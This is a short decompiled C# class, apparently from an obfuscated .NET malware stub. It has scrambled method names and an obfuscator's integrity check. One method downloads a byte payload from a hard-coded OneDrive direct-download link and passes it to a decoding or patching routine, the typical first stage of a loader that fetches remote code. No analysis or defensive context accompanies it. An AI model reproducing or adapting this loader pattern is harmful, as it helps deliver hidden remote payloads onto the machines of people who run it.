internal sealed class StubDicConsumer
{
	private static StubDicConsumer RemoveMapping;

	public StubDicConsumer()
	{
		if (_003CModule_003E_007B384aa0ca_002D0a36_002D4b74_002D82c1_002D2fa89a3d3234_007D.m_ddd0318a030847df8f601026ee846780.m_d2213696341a40f08c0b93995fd6fb6c != 0)
		{
			switch (0)
			{
			}
		}
	}

	private static byte[] MoveEvent(string item)
	{
		return new ClientDicImporter().SelectEvent(item);
	}

	internal static byte[] RemoveEvent()
	{
		return new ClientDicImporter().PatchEvent((byte[])CheckMapping("https://onedrive.live.com/download?cid=BD9480D014FE52E5&resid=BD9480D014FE52E5%21286&authkey=AIuIUmQML1iliFM"));
	}

	internal static bool SetMapping()
	{
		return RemoveMapping == null;
	}

	internal static StubDicConsumer VerifyMapping()
	{
		return RemoveMapping;
	}

	internal static object CheckMapping(object object_0)
	{
		return MoveEvent((string)object_0);
	}
}
